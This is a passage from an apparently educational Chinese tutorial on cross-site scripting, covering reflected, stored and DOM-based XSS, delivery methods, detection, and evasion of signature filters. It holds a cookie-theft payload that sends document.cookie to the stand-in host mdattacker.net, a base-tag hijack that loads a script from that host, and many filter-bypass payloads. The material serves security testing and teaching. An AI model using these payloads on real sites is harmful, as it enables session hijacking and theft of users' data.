<li><p>攻击者创建的恶意JavaScript代码为：</p>
<p>var i = new Image;i.src=”<a href="http://mdattacker.net/&quot;+document.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;+document.cookie</a>;</p>
<p>这段代码可让用户浏览器向mdattacker.net（攻击者拥有的一个域）提出一个请求。请求中包含用户访问应用程序的当前会话令牌：</p>
<p>Get /sessId=23123djksdah2132489021213 HTTP/1.1</p>
<p>Host:mdattacker.net</p>
</li>
<li><p>攻击者监控访问mdattacker.net的请求并收到用户的请求。攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并“代表”该用户执行任意操作。</p>
</li>
</ol>
<h2 id="保存型XSS漏洞"><a href="#保存型XSS漏洞" class="headerlink" title="保存型XSS漏洞"></a>保存型XSS漏洞</h2><p>另一种常见的XSS漏洞叫做保存型跨站点脚本。如果一名用户提交的数据被保存在应用程序中（通常保存在一个后端数据库中），然后不经适当过滤或净化就显示给其他用户，此时就会出现这种漏洞。</p>
<p>在支持中断用户交互的应用程序中，或者在具有管理权限的员工访问同一个应用程序中的用户记录和数据的应用程序中，保存型XSS漏洞很常见。</p>
<p>一般情况下，利用保存型XSS漏洞的攻击至少需要向应用程序提出两个要求。攻击者在第一个请求中传送一些专门设计的数据，其中包含恶意代码，应用程序接受并保存这些数据。在第二个请求中，一名受害者查看某个包含攻击者的数据的页面，这时恶意代码开始执行。为此，这种漏洞有时也叫做二阶跨站点脚本。</p>
<p>下图说明了一名攻击者如何利用保存型XSS漏洞，实施删除利用反射性XSS漏洞实施的相同会话劫持攻击。</p>
<p>反射型与保存型XSS攻击在实施步骤上存在两个重要的区别，这也使得后者往往造成更大的安全威胁。</p>
<p>首先，在反射型XSS脚本攻击中，要利用一个漏洞，攻击者必须以某种方式诱使受害者访问他专门设计的URL。而保存型XSS脚本攻击则没有这种要求。在应用程序中展开攻击后，攻击者只需要等待受害者浏览已被攻破的页面或功能。通常，这个页面是一个正常用户将会主动访问的常规页面。</p>
<p>其次，如果受害者在遭受攻击时正在使用应用程序，攻击者就更容易实现其XSS漏洞的目的。例如，如果当前正在进行会话，那么攻击者就可以劫持这个会话。在反射型XSS攻击中，攻击者可能会说服用户登录，然后单击它们提供的一个链接，从而制造这种情况。或者他可能会部署一个永久性的有效载荷并等待用户登录。因为攻击有效载荷被保存在用户自主访问的一个应用程序页面中，所以，当有效载荷执行时，任何攻击受害者都在使用应用程序。而且，如果上述页面位于应用程序通过验证的区域内，那么攻击受害者一定已经登录。</p>
<p>反射型与保存型XSS攻击之间的这些区别意味着保存型XSS漏洞往往会给应用程序带来更严重的安全威胁。许多时候，攻击者可以向应用程序提交一些专门设计的数据，然后等待受害者访问它们。如果其中一名受害者是管理员，那么攻击者就能够完全攻破整个应用程序。</p>
<h2 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h2><p>反射型和保存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。第三类XSS漏洞并不具有这种特点。在这种漏洞中，攻击者的JavaScript通过以下过程得以执行。</p>
<ul>
<li>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript</li>
<li>服务器的响应中并不一定任何形式包含攻击者的脚本</li>
<li>当用户的浏览器处理这个响应时，上述脚本得以处理。</li>
</ul>
<p>由于客户端JavaScript可以访问浏览器的文本对象模型（Document Object Model， DOM），因此它能够决定用于加载当前页面的URL。由应用程序发布的一段脚本可以从URL中提取数据，对这些数据进行处理，然后用它动态更新页面的内容。如果这样，应用程序就可能易于受到基于DOM的XSS攻击。</p>
<p>回到前面的反射型XSS漏洞中的示例，其中服务器端应用程序讲一个URL参数值复制到一条错误消息中。另一种事项相同功能的办法是由应用程序每次返回相同的静态HTML，并使用客户端JavaScript动态生成消息内容。</p>
<p>例如，假设应用程序返回的错误页面包含以下脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> url = <span class="built_in">document</span>.location;</span><br><span class="line">	url = <span class="built_in">unescape</span>(url);</span><br><span class="line">	<span class="keyword">var</span> message = url.substring(url.indexof(<span class="string">'message='</span>) + <span class="number">8</span>, url.length);</span><br><span class="line">	<span class="built_in">document</span>.write(message);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段脚本解析URL，提取出message参数的值，并把这个值写入页面的HTML源代码中。如果按开发者预想的方式调用，它可以和前面的示例中一样，用于创建错误消息。但是，如果攻击者设计出一个URL，并以JavaScript代码作为message参数，那么这段代码将被动态写入页面中，并向服务器返回代码一样得以执行。在这个示例中，前面示例中利用反射型XSS漏洞的同一个URL也可用于生成一个对话框：</p>
<p><a href="http://mdsec.net/error/18/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/18/Error.ashx?message=</a><script>alert('xss')</script></p>
<p>利用基于DOM的XSS漏洞如下图所示</p>
<p>与保存型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用它们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。</p>
<h2 id="XSS攻击的传送机制"><a href="#XSS攻击的传送机制" class="headerlink" title="XSS攻击的传送机制"></a>XSS攻击的传送机制</h2><p>确定一个XSS漏洞并设计出利用它的有效载荷后，攻击者需要找出办法向应用程序的其他用户传送攻击。</p>
<h3 id="传送反射型与基于DOM的XSS攻击"><a href="#传送反射型与基于DOM的XSS攻击" class="headerlink" title="传送反射型与基于DOM的XSS攻击"></a>传送反射型与基于DOM的XSS攻击</h3><p>除了通过电子邮件向随机用户发亮发送专门设计的URL这种明显的钓鱼向量外，攻击者还可以尝试使用以下机制传送反射型或基于DOM的XSS攻击。</p>
<ul>
<li><p>在由针对性的攻击者，攻击者可以向个体目标用户或少数几名用户发送一封伪造的电子邮件。如果攻击者想要攻破某个特殊用户的会话（而非截取随机用户的会话），实施合理、可靠的针对性攻击往往是最有效的传送机制。有时，我们会把这类攻击称为“鱼叉式钓鱼”。</p>
</li>
<li><p>可以在即时消息中项目表用户提供一个URL。</p>
</li>
<li><p>第三方Web站点上的内容与代码可用于生成触发XSS漏洞的请求。各种常见的应用程序允许用户发布数量有限的HTML标记，这些标记将按原样向其他用户显示。如果可以使用GET方法触发XSS漏洞，攻击者就可以在第三方站点上发布一个指向某恶意URL的IMG标签，任何查看以上第三方内容的用户将在不知情的情况下请求该恶意URL。</p>
<p>或者，攻击者可以创建自己的Web站点，在其中包含诱使用户访问的有趣内容，但也可能含有一些脚本，导致用户的浏览器向易受攻击的应用程序提出包含XSS有效载荷的请求。如果某用户登录以上易受攻击的应用程序，并且碰巧浏览了攻击者的站点，该用户访问以上易受攻击的应用程序的会话将被攻破。</p>
<p>建立适当的Web站点后，攻击者可以使用搜索引擎操纵技巧生成某些用户提交的访问，例如，将相关关键字放入站点内容中并使用相关表达式将其链接到相关站点。但是，这种传送机制与钓鱼攻击无关，因为攻击者的站点并未试图模仿它所针对的站点。</p>
<p>注意，这种传送机制使得攻击者可利用只通过POST请求触发的反射型与基于dom的XSS漏洞。但是，利用这些漏洞，攻击者明显不能通过向受害用户发送一个简单的URL来传送依次攻击。然而，某个恶意Web站点可能包含一个HTML表单，它使用POST方法并以易受攻击的应用程序作为它的目标URL。其页面上的JavaScript或导航空间可用于提交表单，成功利用漏洞。</p>
</li>
<li><p>在另一种利用第三方Web站点的攻击中，一些攻击者付费购买许多链接至一个URL的横幅广告，该URL包含一个针对某易受攻击的应用程序的XSS有效载荷。</p>
</li>
<li><p>许多应用程序执行一种“推荐给朋友”或向站点管理员发送反馈的功能。</p>
</li>
</ul>
<h3 id="传送保存型XSS攻击"><a href="#传送保存型XSS攻击" class="headerlink" title="传送保存型XSS攻击"></a>传送保存型XSS攻击</h3><p>保存型XSS攻击共有两种传送机制：带内与带外传送机制。</p>
<p>带内传送机制适用于大多数情况，这时漏洞数据通过主Web界面提交给应用程序。用户控制的数据最终显示给其他用户的常见位置包含：</p>
<ul>
<li>个人信息字段，如姓名、地址、电子邮件、电话等；</li>
<li>文档、上传文件及其他数据的名称；</li>
<li>提交给应用程序管理员的反馈或问题；</li>
<li>向其他应用程序用户传送的消息、注释、问题等；</li>
<li>记录在应用程序日志中，并通过浏览器显示给管理员的任何内容，如URL、用户名、HTTP Referer、User-Agent等；</li>
<li>在用户之间共享的上传文件内容。</li>
</ul>
<p>在这些情况下，只需向应用程序页面提交XSS有效载荷，然后等待受害者查看恶意代码，就可以传送XSS有效载荷。</p>
<p>带外传送机制适用于通过其他渠道向应用程序提交漏洞数据情况。应用程序通过这种渠道接收数据，并最终在主Web界面生成的HTML页面中显示它。前面描述的针对Web邮件应用程序的攻击就是这种传送机制的典型示例。这种攻击像一个SMTP服务器传送恶意数据，并最终在一条HTML格式的电子邮件消息中向用户显示这些数据。</p>
<h2 id="查找并利用XSS漏洞"><a href="#查找并利用XSS漏洞" class="headerlink" title="查找并利用XSS漏洞"></a>查找并利用XSS漏洞</h2><p>确定XSS漏洞的基本方法是使用下面这个概念验证攻击字符串：</p>
<p><strong>&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</strong></p>
<p>这个字符串被提交给每个应用程序页面的每一个参数；同时，攻击者监控它的响应，看其中是否出现相同的字符串。如果发现攻击字符串按原样出现在响应中，几乎可以肯定应用存在XSS漏洞。</p>
<p>如果仅仅是为了尽可能地确定应用程序中存在某种XSS漏洞，以向其他应用程序用户实施攻击，那么这个基本方法可能使最为有效的方法，因为它可以实现高度自动化，而且很少生成错误警报。但是，如果是对应用程序进行复杂的测试，从而确定尽可能多的漏洞，那么在应用基本方法的同时，还需要组合使用更加复杂的技巧。在以下几种情况下，通过基本的检测方法可能无法确定应用程序中存在XSS漏洞。</p>
<ul>
<li><p>许多应用程序实施基于黑名单的初步过滤，试图阻止XSS攻击。通常，这些过滤在请求参数中寻找<script>之类的表达式，并采取一些防御措施，如删除或编码表达式，或者完全阻止这类请求。基本检测方法中常用的攻击字符串往往被这些过滤阻止。但是，仅仅因为一个常见的攻击字符串被阻止，并不能证明一个可利用的漏洞不存在。如后文所述，在有些情况下，不使用<script>标签，甚至不使用" < >和/这些常被过滤掉的字符，也可以利用XSS漏洞。</p>
</li>
<li><p>许多应用程序实施的防XSS过滤存在缺陷，可以通过各种方法避开。例如，假设在处理用户输入前，应用程序删除其中出现的所有<script>标签。这意味着基本方法中使用的攻击字符串将不会在应用程序的响应中返回。但是，以下一个或几个字符串可轻易避开过滤，成功利用XSS漏洞：</p>
<p><strong>">&lt;script >alert(document.cookie)&lt;/script ></strong></p>
<p><strong>">&lt;ScRiPt>alert(document.cookie)&lt;/ScRiPt></strong></p>
<p><strong>"%3e%3cscript%3ealert(document.cookie)%3c/script%3e</strong></p>
<p><strong>">&lt;scr&lt;script>ipt>alert(document.cookie)&lt;/scr&lt;script>ipt></strong></p>
<p><strong>%00">&lt;script>alert(document.cookie)&lt;/script></strong></p>
</li>
</ul>
<p>注意，在这些情况下，在服务器的响应中，输入的字符串返回前，可能经过净化、编码或其他形式的修改，因而还不足以实现对XSS漏洞的利用。这时，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
<p>当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器DOM中，并可被客户端JavaScript访问。同样，在这种情况下，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
<h3 id="查找并利用反射型XSS漏洞"><a href="#查找并利用反射型XSS漏洞" class="headerlink" title="查找并利用反射型XSS漏洞"></a>查找并利用反射型XSS漏洞</h3><p>要探查反射型XSS漏洞，最可靠的方法是系统性地检查在解析应用程序过程中确定的所有用户输入进入点，并遵循以下步骤。</p>
<ul>
<li>在每个进入点提交的一个良性字母字符串</li>
<li>确定此字符串“反射”在应用程序响应中的所有位置</li>
<li>对于每个反射，确定显示反射型数据时的语法上下文</li>
<li>提交针对反射的语法上下文而修改的数据，尝试在响应中引入任意脚本</li>
<li>如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤</li>
</ul>
<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>检测反射型XSS漏洞最可靠的方法的初始步骤与前面描述的方法类似。</p>
<ol>
<li><p>选择任意一个字符串，该字符串不曾出现在应用程序的任何地方，而且其中仅包含字母字符，因此不可能受到针对XSS过滤的影响。例如：</p>
<p><strong>myxsstestdmqlwp</strong></p>
<p>提交这个字符串，以其作为每个页面的每一个参数，且每次只针对一个参数。</p>
</li>
<li><p>监控应用程序的响应，看其中是否出现同一个字符串。记下参数值被复制到应用程序响应中的每一个参数。这些参数不一定容易受到攻击，但需要对它们进行深入分析。</p>
</li>
<li><p>注意，必须测试所有GET与POST请求，检查URL查询字符串与消息主体中的每一个参数。虽然有少数XSS漏洞传送机制只能通过一个POST请求触发，但仍有可能对漏洞加以利用。</p>
</li>
<li><p>任何时候，一旦在POST请求中发现XSS，应使用burp中的“更改请求方法”选项确定是否可以通过GET请求实施相同的攻击</p>
</li>
<li><p>除标准的请求参数外，还应该检测HTTP请求消息头内容被应用程序处理的每一种情况。有一种常见的XSS漏洞出现在错误消息中，这时Referer与User-Agent消息头之类的数据项被复制到消息的内容中。这些消息头是传送反射型XSS攻击的有效工具，因为攻击者可以使用一个Flash对象诱使受害者提出一个包含任意HTTP消息头的请求。</p>
</li>
</ol>
<h4 id="测试引入脚本的反射"><a href="#测试引入脚本的反射" class="headerlink" title="测试引入脚本的反射"></a>测试引入脚本的反射</h4><p>必须手动检查已确定的每一个反射型输实例，已核实其是否可被利用。在响应中包含反射型数据的每个位置，都需要确认该数据的语法特点。这时，必须找到某种修改输入的方法，以便在将输入复制到应用程序响应中的相同位置时，任何脚本都能够得到以执行。下面分析这方面的一些示例。</p>
<h5 id="例1：标签属性值"><a href="#例1：标签属性值" class="headerlink" title="例1：标签属性值"></a>例1：标签属性值</h5><p>假设返回的页面中包含以下脚本：</p>
<p><strong>&lt;input type="text" name="address1" value="mysxxtestdmqlwp"></strong></p>
<p>很明显，利用XSS的一种方法是终止包含字符串的双引号，结束&lt;input>标签，然后通过其他方法引入JavaScript脚本（使用&lt;script>等）。例如：</p>
<p>** " onfocus="alert(1)**</p>
<h5 id="例2：JavaScript字符串"><a href="#例2：JavaScript字符串" class="headerlink" title="例2：JavaScript字符串"></a>例2：JavaScript字符串</h5><p>假设返回的页面包含以下脚本：</p>
<p><strong>&lt;script>var a = 'myxsstestdmqlwp';var b = 123;...&lt;/script></strong></p>
<p>这时受控制的字符串被直接插入到现有的一段脚本中。要利用XSS，可以终止字符串周围的单引号，用一个分号终止整个语句，然后直接处理想要执行的JavaScript。例如：</p>
<p><strong>'; alert(1); var foo='</strong></p>
<p>注意，因为已经终止了一个被引用的字符串，为阻止JavaScript解释器出现错误，必须在注入的代码后使用有效的语法确保脚本继续正常执行。在这个示例中，变量foo被声明，另一个引用字符串被打开，它们将被紧随在字符串后面的代码终止。另一种经常有效的方法是使用//结束输入，将剩下的脚本当做注释处理。</p>
<h5 id="例3：包含URL的特性"><a href="#例3：包含URL的特性" class="headerlink" title="例3：包含URL的特性"></a>例3：包含URL的特性</h5><p>假设返回的页面包含以下脚本：</p>
<p><strong>&lt;a href='"myxsstestdmqlwp">Click hear ...&lt;/a></strong></p>
<p>这时，受控制的字符串插入到一个&lt;a>标签的href属性中。在一些浏览器中，这个属性可能包含一个使用javascript:协议的URL，从而可以使用以下脚本直接利用XSS：</p>
<p><strong>javascript:alert(1)</strong></p>
<p>如前所述，因为输入将反射到标签属性中，因此这时还可以注入一个事件处理器。</p>
<p>要向当前所有的浏览器实施攻击，可以同时使用一个无效的图像名称与一个onerror事件处理器：</p>
<p><strong>#“onclick="javascript:alert(1)</strong></p>
<p>对于在前面步骤中记下的每一个潜在的XSS漏洞，采取以下措施。</p>
<ol>
<li>检查HTML源代码，确定受控制的字符串的位置</li>
<li>如果字符串出现在几个位置，应将每个位置当做一个潜在的漏洞，分别进行分析</li>
<li>根据用户控制的字符串在HTML中的位置，确定需要如何对其进行修改以使任意JavaScript得以执行。通常，有大量方法可称为传送攻击的有效工具。</li>
<li>向应用程序提交设计的字符串，测试它是否有用。如果涉及的字符串仍然按原样返回，表示应用程序存在XSS漏洞。使用一段概念验证脚本显示一个警报对话框，重复检查语法是否正确，并确定响应显示时，对话框是否出现在浏览器中。</li>
</ol>
<h4 id="探查防御性反射"><a href="#探查防御性反射" class="headerlink" title="探查防御性反射"></a>探查防御性反射</h4><p>通常情况下最初提交的攻击字符串并不会被服务器按原样返回，因而无法成功执行注入的JavaScript。如果是这样，不要放弃！接下来应该确定服务器对输入进行了哪些处理。主要有以下3中可能的情况。</p>
<ul>
<li>应用程序或者Web应用程序防火墙保护的应用程序发现一个攻击签名，完全阻止了输入。</li>
<li>应用程序已经接受了输入，但对攻击字符串进行了某种净化或编码。</li>
<li>应用程序把攻击字符串截短至某个固定的最大长度。</li>
</ul>
<h4 id="避开基于签名的过滤"><a href="#避开基于签名的过滤" class="headerlink" title="避开基于签名的过滤"></a>避开基于签名的过滤</h4><h5 id="引入脚本代码的方法"><a href="#引入脚本代码的方法" class="headerlink" title="引入脚本代码的方法"></a>引入脚本代码的方法</h5><p>有4中不同的方法可用于在HTML页面中引入脚本代码。</p>
<h5 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h5><p>除直接使用&lt;script>标签外，还可以通过各种方法、使用复杂的语法来隐藏标签，从而避开某些过滤：</p>
<p><strong>&lt;object data="data:text/html,&lt;script>alert(1)&lt;/script>"></strong></p>
<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ=="></strong></p>
<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==">Click here&lt;/a></strong></p>
<p>上述基于Base64的字符串为：</p>
<p><strong>&lt;script>alert(1)&lt;/script></strong></p>
<h6 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h6><p>有大量事件处理器可与各种标签结合使用，以用于执行脚本。以下是一些较为少见的示例，可在不需要任何用户交互的情况下执行脚本：</p>
<p><strong>&lt;xml onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;style onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;iframe onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;object onerror=alert(1)></strong></p>
<p><strong>&lt;object type=image src=valid.gif onreadystatechange=alert(1)>&lt;/object></strong></p>
<p><strong>&lt;img type=image src=valid.gif onreadystatechange=alert(1)></strong></p>
<p><strong>&lt;input type=image src=valid.gif onreadystatechange=alert(1)></strong> </p>
<p><strong>&lt;isindex type=image src=valid.gif onreadychangestate=alert(1)></strong></p>
<p><strong>&lt;script onreadychangestate=alert(1)></strong></p>
<p><strong>&lt;bgsound  onpropertychange=alert(1)></strong></p>
<p><strong>&lt;body onbeforeactivate=alert(1)></strong></p>
<p><strong>&lt;body onactivate=alert(1)></strong></p>
<p><strong>&lt;body onfocusin=alert(1)></strong></p>
<p>HTML5使用事件处理器提供了大量的向量。这包括使用autofocus属性自动触发之前需要用户交互的事件：</p>
<p><strong>&lt;input autofocus onfocus=alert(1)></strong></p>
<p><strong>&lt;input onblur=alert(1) autofocus>&lt;input autofocus></strong></p>
<p><strong>&lt;body onscroll=alert(1)>&lt;br>&lt;br>...&lt;br>&lt;input autofocus></strong></p>
<p>它允许在结束标签中使用事件处理器：</p>
<p><strong>&lt;a onmousemove=alert(1)></strong></p>
<p>最后HTML5还通过事件处理器引入了新标签：</p>
<p><strong>&lt;video src=1 onerror=alert(1)></strong></p>
<p><strong>&lt;audio src=1 onerror=alert(1)></strong></p>
<h6 id="脚本伪协议"><a href="#脚本伪协议" class="headerlink" title="脚本伪协议"></a>脚本伪协议</h6><p>脚本伪协议可用在各种位置，以在需要URL的属性中执行行内脚本。以下是一些示例：</p>
<p><strong>&lt;object data=javascript:alert(1)></strong></p>
<p><strong>&lt;iframe src=javascript:alert(1)></strong></p>
<p><strong>&lt;embed src=javascript:alert(1)></strong></p>
<p>和事件处理器一样，HTML5也提供一些在XSS攻击蔗农使用脚本伪协议的新方法：</p>
<p><strong>&lt;form id=test/>&lt;button form=test formaction=javascript:alert(1)></strong></p>
<p><strong>&lt;event-source src=javascript:alert(1)></strong></p>
<p>在针对输入过滤进行攻击时，新的event-source标签特别有用。与之前任何的HTML5标签不同，它的名字中包含一个连字符，因此，使用这个标签可以避开传统的、认为标签名称只能包含字母的基于正则表达式的过滤。</p>
<h6 id="动态求值的样式"><a href="#动态求值的样式" class="headerlink" title="动态求值的样式"></a>动态求值的样式</h6><p>一些浏览支持在动态求值的CSS样式中使用JavaScript。以下示例可在IE7及其早期版本上执行，如果在兼容模式下运行，还可以再后续版本上执行：</p>
<p><strong>&lt;x style=x:expression(alert(1))</strong></p>
<p>最新版本的IE不再支持上述语法，因为这些语法只能用在XSS攻击中。但是，在最新版的IE中，使用以下请求就可以达到同样的效果：</p>
<p><strong>&lt;x style=behavior:url(#default#time2) onbegin=alert(1)></strong></p>
<h6 id="避开过滤-HTML"><a href="#避开过滤-HTML" class="headerlink" title="避开过滤:HTML"></a>避开过滤:HTML</h6><p>旨在阻止XSS攻击的基于签名的过滤通常采用正则表达式或其他技巧来确定关键的HTML组件，如标签括号、标签名称、属性名称和属性值。例如，过滤器可能会阻止包含使用已知可用于引入脚本的特殊标签或属性名称的HTML输入，或试图阻止以脚本伪协议开头的属性值。通过一种或多种浏览器接受的方式在HTML的关键位置插入不常见的字符，可以避开其中许多过滤。</p>
<p>以下面这段简单的脚本为例：</p>
<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
<p>可以通过各种方式修改这段脚本，并使它至少可以在一个浏览器中运行。</p>
<h6 id="标签名称"><a href="#标签名称" class="headerlink" title="标签名称"></a>标签名称</h6><p>从起始标签名称开始，只需改变所使用字符的大小写，即可避开最简单的过滤：</p>
<p><strong>&lt;iMg onerror=alert(1) src=a></strong></p>
<p>更进一步，可以在任何位置插入NULL字节：</p>
<p><strong>&lt;[%00]img onerror=alert(1) src=a></strong></p>
<p><strong>&lt;i[%00]mg onerror=alert(1) src=a></strong></p>
<p>再进一步，如果对上面的标签名称稍作修改，就可以使用任意标签名称引入事件处理器，从而避开仅仅阻止特定标签名称的过滤：</p>
<p><strong>&lt;x onclick=alert(1) src=a>Click here&lt;/x></strong></p>
<p>有时，可以引入不同名称的新标签，但却找不到使用这些标签直接执行代码的方法。在这些情况下，可以使用一种称为“基本标签劫持”的技巧来实施攻击。&lt;base>标签用于指定一个URL，浏览器应使用该URL解析随后在页面中出现的任何相对URL。如果可以引入一个新&lt;base>，并且页面执行反射点后的任何使用相对URL的&lt;script>，则就可以指定一个指向受你控制的服务器的基本URL。当浏览器加载在HTML页面的剩余指定部分的脚本时，这些脚本将从指定的服务器加载，但仍然能够在调用它们的页面中执行。例如：</p>
<p><strong>&lt;base href="<a href="http://mdattacker.net/badscript.js/&quot;&gt;" target="_blank" rel="noopener">http://mdattacker.net/badscript.js/&quot;&gt;</a></strong></p>
<p>...</p>
<p><strong>&lt;script src="goodscript.js">&lt;/script></strong></p>
<p>根据规范，&lt;base>标签应出现在HTML页面的&lt;head>部分。但是，一些浏览器，如Firefox，运行其出现在页面的任何位置，这显著扩大了这种攻击范围。</p>
<h6 id="标签名称的空格"><a href="#标签名称的空格" class="headerlink" title="标签名称的空格"></a>标签名称的空格</h6><p>一些字符可用于替代标签名称与第一个属性名称之间的空格：</p>
<p><strong>&lt;img/onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%09]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%0d]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img[%0a]onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/"onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/'onerror=alert(1) src=1></strong></p>
<p><strong>&lt;img/anyjunk/onerror=alert(1) src=1></strong></p>
<p>需要注意的是，即使在实施攻击时不需要任何标签属性，仍然应始终在标签名称后面添加一些多余的内容，因为这样做可以避开一些简单的过滤：</p>
<p><strong>&lt;script/anyjunk>alert(1)&lt;script></strong></p>
<h6 id="属性名称"><a href="#属性名称" class="headerlink" title="属性名称"></a>属性名称</h6><p>也可以在属性名称中使用上述NULL技巧。这样做可以避开许多视图通过阻止以on开头的属性名称来阻止时间过滤器的简单过滤：</p>
<p><strong>&lt;img o[%00]nerror=alert(1) src=1></strong></p>
<h6 id="属性分隔符"><a href="#属性分隔符" class="headerlink" title="属性分隔符"></a>属性分隔符</h6><p>在最初的示例中，属性值之间并未分割开来，因而需要在属性值后面插入一些空格，表示属性值已结束，以便于添加其他属性。属性可以选择使用双引号或单引号进行分割，或在IE上使用重音符分隔：</p>
<p><strong>&lt;img onerror="alert(1)"src=a></strong></p>
<p><strong>&lt;img onerror=‘alert(1)’src=a></strong></p>
<p><strong>&lt;img onerror=<code>alert(1)</code>src=a></strong></p>
<p>前面的示例提供了另一种方法，可用于避开一些检查以ON开头的属性名称的过滤器。如果过滤器不知道重音符被用作属性分隔符，它会将下面的示例视为仅包含一个属性，其名称不再为事件处理器的名称：</p>
<p><strong>&lt;img src=`a`onerror=alert(1)></strong></p>
<p>通过使用引号分隔的属性，并在标签名称后插入异常字符，就可以设计出不需要使用任何空格的攻击，从而避开一些简单的过滤:</p>
<p><strong>&lt;/onerror="alert(1)"src=a></strong></p>
<h6 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h6><p>在属性值中，可以使用NULL字节技巧。还可以使用HTML编码的字符，如下所示：</p>
<p><strong>&lt;img onerror=a[%00]lert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x6c;lert(1) src=a></strong></p>
<p>在进一步处理属性值之前，浏览器会对其进行HTML编码，因此，可以使用HTML编码对脚本代码进行模糊处理，从而避开任何过滤。例如，以下攻击避开了许多试图阻止JavaScript为协议处理器的过滤：</p>
<p><strong>&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; ></strong></p>
<p>在使用HTML编码时，值得注意的是，浏览器接受规范的各种辩题，甚至可能忽略过滤器“意识到”的HTML编码问题，可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾的分号。以下示例至少可以用在一种浏览器中：</p>
<p><strong>&lt;img onerror=a&amp;#x06c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x006c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x0006c;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x108;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#0108;ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x108ert(1) src=a></strong></p>
<p><strong>&lt;img onerror=a&amp;#x0108ert(1) src=a></strong></p>
<h6 id="标签括号"><a href="#标签括号" class="headerlink" title="标签括号"></a>标签括号</h6><p>有些时候，通过利用奇怪的应用程序或浏览器行为，甚至可以使用无效的标签括号，并且仍然使浏览器按攻击所需的方式处理相关标签。</p>
<p>一些应用程序在应用输入过滤后还执行不必要的URL解码，因此，请求中的以下输入：</p>
<p><strong>%253cimg%20onerror=alert(1)%20src=a%253e</strong></p>
<p>被应用程序服务器进行URL解码，然后将以下输入传递给应用程序：</p>
<p><strong>%3cimg onerror=alert(1) src=a%3e</strong></p>
<p>其中并不包含任何标签括号，因此并不会被输入过滤阻止。但是引用程序随后会执行第二次URL解码，因此输入将变为：</p>
<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
<p>该输入会回显给用户，导致攻击得以实施。</p>
<p>如果应用程序框架基于字形和发音的相似性，将不常见的Unicode字符“转换“为它们最接近的ASCII字符，这时可能会出现与上述示例类似的情况。例如，以下输入使用Unicode双角引号（%u00AB和%u00BB），而不是标签括号：</p>
<p><strong>《img onerror=alert(1) src=a》</strong></p>
<p>应用程序的输入可能会允许该输入，因为其中斌不包含任何有问题的HTML。但是，如果应用程序框架在输入被插到响应中时将引号转化为标签字符，攻击将取得成功。实施证明，由于开发这段额输入，大量应用程序都易于受到这种攻击。</p>
<p>一些输入过滤通过简单地匹配起始和结束尖括号，提取内容，并将其与标签名称黑名单进行比较来识别HTML标签。在这种情况下，可以通过使用多余的括号来避开过滤：</p>
<p><strong>&lt;&lt;script> alert(1);//&lt;&lt;/script></strong></p>
<p>某些情况下，可以利用浏览器的HTML解析器的异常行为来实施攻击，从而避开应用程序的输入过滤。例如，以下HTML使用了ECMAScript for XML（E4X），其中并不包含有效的起始脚本标签，但仍然可以在当前版本的Firefox中执行包含的脚本：</p>
<p><strong>&lt;script&lt;{alert(1)}/>&lt;/script></strong></p>
<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>某些情况下，可以找到办法来操纵反射型输入，从而在应用程序的响应中插入脚本。但是，可能会遇到其他各种障碍，无法执行实施有效攻击所需的代码。这时，遇到的过滤通常会试图阻止使用某些JavaScript关键字和其他表达式。它们还可能阻止有用的字符，如引号、括号和圆点。</p>
<p>和使用HTML对攻击进行模糊处理一样，也可以通过使用各种技巧来修改所需大的脚本代码</p>
